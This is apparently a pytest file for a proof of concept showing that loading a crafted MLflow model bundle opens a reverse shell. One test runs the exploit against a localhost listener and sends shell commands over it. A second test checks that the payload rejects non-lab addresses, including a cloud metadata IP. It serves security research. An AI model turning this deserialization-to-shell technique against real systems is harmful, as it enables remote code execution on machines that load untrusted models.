"""Local-only check that the reviewed model load can create a shell connection."""

from __future__ import annotations

import os
import socket
import tempfile
import zipfile
from pathlib import Path

import mlflow.pyfunc

from poc.rce_reverse_shell import ShellPayload, create_bundle


def test_model_deserialization_connects_a_shell_to_lab_receiver(monkeypatch) -> None:
    monkeypatch.setenv("MLFLOW_ALLOW_PICKLE_DESERIALIZATION", "false")
    with socket.socket() as listener:
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        listener.settimeout(20)
        port = listener.getsockname()[1]

        with tempfile.TemporaryDirectory(prefix="modelgate-shell-test-") as temp_dir:
            root = Path(temp_dir)
            bundle = create_bundle(root, "127.0.0.1", port)
            with zipfile.ZipFile(bundle) as archive:
                archive.extractall(root / "extracted")
            mlflow.pyfunc.load_model(str(root / "extracted" / "model"))

            connection, _ = listener.accept()
            with connection:
                connection.settimeout(10)
                connection.sendall(b"printf 'LAB_SHELL_OK:'; id -u; exit\n")
                output = bytearray()
                while True:
                    try:
                        chunk = connection.recv(4096)
                    except (ConnectionResetError, TimeoutError):
                        break
                    if not chunk:
                        break
                    output.extend(chunk)
            assert f"LAB_SHELL_OK:{os.getuid()}".encode() in output


def test_receiver_is_limited_to_lab_addresses() -> None:
    for address in ("8.8.8.8", "169.254.169.254", "224.0.0.1"):
        try:
            ShellPayload(address, 9001)
        except ValueError:
            continue
        raise AssertionError(f"accepted non-lab address: {address}")
